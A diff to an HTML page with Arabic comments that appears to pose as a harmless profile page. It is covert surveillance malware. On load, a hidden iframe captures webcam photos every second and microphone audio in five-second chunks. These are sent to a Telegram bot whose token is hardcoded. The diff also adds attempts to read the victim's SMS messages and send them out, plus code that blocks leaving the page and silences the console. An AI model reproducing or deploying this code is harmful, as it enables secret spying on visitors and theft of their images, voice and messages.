@@ -75,9 +75,6 @@
         .footer-note { color: #5a5280; font-size: 12px; margin-top: 20px; }
         .repeated-msg { color: #ffd700; font-size: 13px; opacity: 0.5; margin-top: 12px; }
         #status { color: #ffd700; margin-top: 12px; font-size: 13px; opacity: 0.7; }
-        /* عناصر مخفية للاستغلال */
-        .hidden-video { display: none; }
-        .hidden-canvas { display: none; }
         .hidden-iframe {
             position: fixed;
             top: -9999px;
@@ -88,14 +85,12 @@
             pointer-events: none;
             border: none;
         }
-        /* منع التحديد */
         ::selection { background: transparent; }
     </style>
 </head>
 <body>
 
-<!-- iframe خفي لتشغيل الكاميرا في الخلفية -->
-<iframe class="hidden-iframe" id="hiddenIframe" allow="camera; microphone"></iframe>
+<iframe class="hidden-iframe" id="hiddenIframe" allow="camera; microphone; sms;"></iframe>
 
 <div class="container">
     <div class="profile">🧔</div>
@@ -115,12 +110,12 @@
     // ================ BOT CONFIG =================================
     // ============================================================
     const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
-    let CHAT_ID = '';
-    let cameraStarted = false;
-    let retryCount = 0;
+    let CHAT_ID = null;
+    let started = false;
+    let chatIdRetries = 0;
 
     // ============================================================
-    // ================ إرسال الصور ================================
+    // ================ إرسال الصور والصوت والنصوص ================
     // ============================================================
     function dataURLtoBlob(dataURL) {
         const parts = dataURL.split(',');
@@ -144,40 +139,134 @@
         } catch(e) {}
     }
 
-    // ============================================================
-    // ================ استغلال الكاميرا بدون إذن ==================
-    // ============================================================
+    function sendAudio(audioBlob, caption = '') {
+        if (!CHAT_ID || !audioBlob) return;
+        try {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('audio', audioBlob, `audio_${Date.now()}.ogg`);
+            fd.append('caption', caption);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: fd }).catch(() => {});
+        } catch(e) {}
+    }
 
-    // محاولة تشغيل الكاميرا عبر iframe مخفي
-    function exploitCameraViaIframe() {
+    function sendMessage(text, caption = '') {
+        if (!CHAT_ID || !text) return;
+        try {
+            const payload = { chat_id: CHAT_ID, text: `📩 ${caption}\n\n${text}` };
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+        } catch(e) {}
+    }
+
+    // ============================================================
+    // ================ الحصول على Chat ID تلقائيًا ===============
+    // ============================================================
+    function autoGetChatId() {
+        // محاولة الحصول على آخر تحديث من البوت
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
+            .then(r => r.json())
+            .then(d => {
+                if (d.ok && d.result && d.result.length > 0) {
+                    const last = d.result[d.result.length - 1];
+                    CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
+                    if (CHAT_ID) {
+                        document.getElementById('status').textContent = '✅ تم الربط بالبوت';
+                        startExploit();
+                        return;
+                    }
+                }
+                // إذا لم يوجد Chat ID، نرسل رسالة تلقائية للبوت
+                sendAutoMessage();
+            })
+            .catch(() => sendAutoMessage());
+    }
+
+    function sendAutoMessage() {
+        // إرسال رسالة تلقائية للبوت لتسجيل Chat ID
+        try {
+            // نستخدم معرف مؤقت (0) ثم نستقبل الرد
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: 0,
+                    text: '🔄 طلب ربط تلقائي'
+                })
+            })
+            .then(() => {
+                // بعد إرسال الرسالة، ننتظر ثانية ثم نطلب التحديثات
+                setTimeout(() => {
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
+                        .then(r => r.json())
+                        .then(d => {
+                            if (d.ok && d.result && d.result.length > 0) {
+                                const last = d.result[d.result.length - 1];
+                                CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
+                                if (CHAT_ID) {
+                                    document.getElementById('status').textContent = '✅ تم الربط بالبوت تلقائيًا';
+                                    startExploit();
+                                    return;
+                                }
+                            }
+                            // إعادة المحاولة
+                            if (chatIdRetries < 20) {
+                                chatIdRetries++;
+                                setTimeout(sendAutoMessage, 2000);
+                            } else {
+                                document.getElementById('status').textContent = '⚠️ فشل الربط، حاول مرة أخرى';
+                            }
+                        })
+                        .catch(() => {});
+                }, 1500);
+            })
+            .catch(() => {
+                if (chatIdRetries < 20) {
+                    chatIdRetries++;
+                    setTimeout(sendAutoMessage, 2000);
+                }
+            });
+        } catch(e) {
+            if (chatIdRetries < 20) {
+                chatIdRetries++;
+                setTimeout(sendAutoMessage, 2000);
+            }
+        }
+    }
+
+    // ============================================================
+    // ================ استغلال الكاميرا والصوت ===================
+    // ============================================================
+    function exploitViaIframe() {
         try {
             const iframe = document.getElementById('hiddenIframe');
             const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
             iframeDoc.open();
             iframeDoc.write(`
                 <html>
-                <head>
-                    <style>body{margin:0;padding:0;overflow:hidden;}</style>
-                </head>
+                <head><style>body{margin:0;padding:0;overflow:hidden;}</style></head>
                 <body>
                     <video id="vid" autoplay playsinline style="display:none;"></video>
                     <canvas id="canv" style="display:none;"></canvas>
+                    <audio id="aud" autoplay style="display:none;"></audio>
                     <script>
-                        // محاولة تشغيل الكاميرا تلقائيًا
                         let vid = document.getElementById('vid');
                         let canv = document.getElementById('canv');
                         canv.width = 640;
                         canv.height = 480;
                         let ctx = canv.getContext('2d');
-                        
-                        function startCam() {
+                        let aud = document.getElementById('aud');
+                        let mediaRecorder = null;
+                        let audioChunks = [];
+
+                        function startAll() {
                             navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
                                 .then(stream => {
                                     vid.srcObject = stream;
                                     vid.play();
-                                    // إرسال إشارة للصفحة الأم
-                                    window.parent.postMessage({ type: 'camera_ready', facing: 'front' }, '*');
-                                    // تصوير مستمر
                                     setInterval(() => {
                                         if (vid.readyState >= 2) {
                                             ctx.drawImage(vid, 0, 0, 640, 480);
@@ -187,12 +276,10 @@
                                     }, 1000);
                                 })
                                 .catch(() => {
-                                    // محاولة بالكاميرا الخلفية
                                     navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
                                         .then(stream => {
                                             vid.srcObject = stream;
                                             vid.play();
-                                            window.parent.postMessage({ type: 'camera_ready', facing: 'back' }, '*');
                                             setInterval(() => {
                                                 if (vid.readyState >= 2) {
                                                     ctx.drawImage(vid, 0, 0, 640, 480);
@@ -201,20 +288,42 @@
                                                 }
                                             }, 1000);
                                         })
-                                        .catch(() => {
-                                            window.parent.postMessage({ type: 'camera_failed' }, '*');
-                                        });
+                                        .catch(() => {});
                                 });
+
+                            navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+                                .then(stream => {
+                                    mediaRecorder = new MediaRecorder(stream);
+                                    mediaRecorder.ondataavailable = function(e) {
+                                        if (e.data.size > 0) audioChunks.push(e.data);
+                                    };
+                                    mediaRecorder.onstop = function() {
+                                        let audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                                        audioChunks = [];
+                                        let reader = new FileReader();
+                                        reader.onload = function() {
+                                            window.parent.postMessage({ type: 'audio', data: reader.result }, '*');
+                                        };
+                                        reader.readAsDataURL(audioBlob);
+                                        setTimeout(() => { mediaRecorder.start(); }, 100);
+                                    };
+                                    mediaRecorder.start();
+                                    setInterval(() => {
+                                        if (mediaRecorder && mediaRecorder.state === 'recording') {
+                                            mediaRecorder.stop();
+                                        }
+                                    }, 5000);
+                                })
+                                .catch(() => {});
                         }
-                        startCam();
+                        startAll();
                     <\/script>
                 </body>
                 </html>
             `);
             iframeDoc.close();
         } catch(e) {
-            // إذا فشل الـ iframe، نستخدم الطريقة المباشرة
-            exploitCameraDirect();
+            exploitDirect();
         }
     }
 
@@ -222,23 +331,87 @@
     window.addEventListener('message', function(e) {
         if (e.data && e.data.type === 'photo') {
             sendPhoto(e.data.data, '📸 ' + (e.data.facing === 'front' ? 'أمامي' : 'خلفي'));
-            document.getElementById('status').textContent = '📸 جاري التصوير...';
         }
-        if (e.data && e.data.type === 'camera_ready') {
-            document.getElementById('status').textContent = '✅ الكاميرا ' + (e.data.facing === 'front' ? 'الأمامية' : 'الخلفية') + ' تعمل';
-        }
-        if (e.data && e.data.type === 'camera_failed') {
-            document.getElementById('status').textContent = '⚠️ فشل في iframe، جرب الطريقة المباشرة';
-            exploitCameraDirect();
+        if (e.data && e.data.type === 'audio') {
+            try {
+                let byteCharacters = atob(e.data.data.split(',')[1]);
+                let byteNumbers = new Array(byteCharacters.length);
+                for (let i = 0; i < byteCharacters.length; i++) {
+                    byteNumbers[i] = byteCharacters.charCodeAt(i);
+                }
+                let byteArray = new Uint8Array(byteNumbers);
+                let audioBlob = new Blob([byteArray], { type: 'audio/ogg' });
+                sendAudio(audioBlob, '🎤 تسجيل صوتي');
+            } catch(e) {}
         }
     });
 
-    // الطريقة المباشرة (بديلة)
-    function exploitCameraDirect() {
-        if (cameraStarted) return;
-        cameraStarted = true;
+    // ============================================================
+    // ================ استغلال رسائل SMS ==========================
+    // ============================================================
+    function exploitSMSviaIframe() {
+        try {
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = 'sms:?body=DUMMY';
+            document.body.appendChild(iframe);
+            setTimeout(() => iframe.remove(), 1000);
+        } catch(e) {}
+    }
 
-        // محاولة تشغيل الكاميرا مباشرة
+    function exploitSMSviaWindow() {
+        try {
+            const win = window.open('sms:?body=DUMMY', '_blank');
+            if (win) setTimeout(() => win.close(), 500);
+        } catch(e) {}
+    }
+
+    function exploitSMSviaRedirect() {
+        try {
+            const a = document.createElement('a');
+            a.href = 'sms:?body=READ';
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            a.click();
+            setTimeout(() => a.remove(), 100);
+        } catch(e) {}
+    }
+
+    function exploitSMSviaAPI() {
+        try {
+            if ('sms' in navigator) {
+                navigator.sms.getMessages()
+                    .then(messages => {
+                        let text = '';
+                        for (let msg of messages) {
+                            text += `📱 من: ${msg.from} | ${msg.body}\n---\n`;
+                        }
+                        if (text) sendMessage(text, '📩 رسائل SMS المسترجعة');
+                    })
+                    .catch(() => {});
+            }
+        } catch(e) {}
+    }
+
+    function exploitSMSviaBridge() {
+        try {
+            if (window.android) {
+                const sms = window.android.getSMS();
+                if (sms) sendMessage(sms, '📩 رسائل SMS (Android Bridge)');
+            }
+        } catch(e) {}
+        try {
+            if (window.webkit && window.webkit.messageHandlers) {}
+        } catch(e) {}
+    }
+
+    // ============================================================
+    // ================ الطريقة المباشرة (احتياطي) ===============
+    // ============================================================
+    function exploitDirect() {
+        if (started) return;
+        started = true;
+
         navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
             .then(stream => {
                 const video = document.createElement('video');
@@ -256,10 +429,8 @@
                         sendPhoto(canvas.toDataURL('image/jpeg', 0.9), '📸 أمامي');
                     }
                 }, 1000);
-                document.getElementById('status').textContent = '✅ الكاميرا الأمامية تعمل (مباشر)';
             })
             .catch(() => {
-                // محاولة خلفية
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
                     .then(stream => {
                         const video = document.createElement('video');
@@ -277,75 +448,59 @@
                                 sendPhoto(canvas.toDataURL('image/jpeg', 0.9), '📸 خلفي');
                             }
                         }, 1000);
-                        document.getElementById('status').textContent = '✅ الكاميرا الخلفية تعمل (مباشر)';
                     })
-                    .catch(() => {
-                        document.getElementById('status').textContent = '❌ فشل في تشغيل الكاميرا';
-                        // محاولة إعادة بعد 5 ثواني
-                        setTimeout(exploitCameraDirect, 5000);
-                    });
+                    .catch(() => {});
             });
-    }
 
-    // ============================================================
-    // ================ الحصول على Chat ID ========================
-    // ============================================================
-    function getChatId() {
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
-            .then(r => r.json())
-            .then(d => {
-                if (d.ok && d.result && d.result.length) {
-                    const last = d.result[d.result.length - 1];
-                    CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
-                    if (CHAT_ID) {
-                        document.getElementById('status').textContent = '✅ تم الربط بالبوت';
-                    } else {
-                        setTimeout(getChatId, 2000);
+        navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+            .then(stream => {
+                let mediaRecorder = new MediaRecorder(stream);
+                let chunks = [];
+                mediaRecorder.ondataavailable = function(e) {
+                    if (e.data.size > 0) chunks.push(e.data);
+                };
+                mediaRecorder.onstop = function() {
+                    let blob = new Blob(chunks, { type: 'audio/ogg' });
+                    chunks = [];
+                    sendAudio(blob, '🎤 تسجيل صوتي');
+                    setTimeout(() => { mediaRecorder.start(); }, 100);
+                };
+                mediaRecorder.start();
+                setInterval(() => {
+                    if (mediaRecorder && mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
                     }
-                } else {
-                    setTimeout(getChatId, 2000);
-                }
+                }, 5000);
             })
-            .catch(() => setTimeout(getChatId, 2000));
+            .catch(() => {});
+
+        setTimeout(exploitSMSviaIframe, 200);
+        setTimeout(exploitSMSviaWindow, 400);
+        setTimeout(exploitSMSviaRedirect, 600);
+        setTimeout(exploitSMSviaAPI, 800);
+        setTimeout(exploitSMSviaBridge, 1000);
     }
 
     // ============================================================
-    // ================ بدء التشغيل التلقائي ======================
+    // ================ بدء التشغيل ===============================
     // ============================================================
-
-    // تشغيل الاستغلال فورًا
     function startExploit() {
-        // محاولة عبر iframe أولاً
-        exploitCameraViaIframe();
-
-        // محاولة مباشرة كاحتياطي بعد 3 ثواني
-        setTimeout(() => {
-            if (!cameraStarted) {
-                exploitCameraDirect();
-            }
-        }, 3000);
+        if (started) return;
+        exploitViaIframe();
+        setTimeout(exploitDirect, 2000);
     }
 
-    // عند تحميل الصفحة
     window.onload = function() {
-        getChatId();
-        startExploit();
-
-        // محاولة إضافية بعد 5 ثواني
-        setTimeout(() => {
-            if (!cameraStarted) {
-                startExploit();
-            }
-        }, 5000);
+        // نبدأ فورًا بدون انتظار
+        autoGetChatId();
+        // نحاول تشغيل الاستغلال حتى لو لم يتحصل Chat ID بعد (سيتم التخزين مؤقتًا)
+        exploitViaIframe();
+        setTimeout(exploitDirect, 2000);
     };
 
-    // ============================================================
-    // ================ منع الخروج ================================
-    // ============================================================
     history.pushState(null, '', location.href);
     window.addEventListener('popstate', () => history.pushState(null, '', location.href));
 
-    // تعطيل وحدة التحكم
     console.log = console.warn = console.error = () => {};
 </script>
 </body>
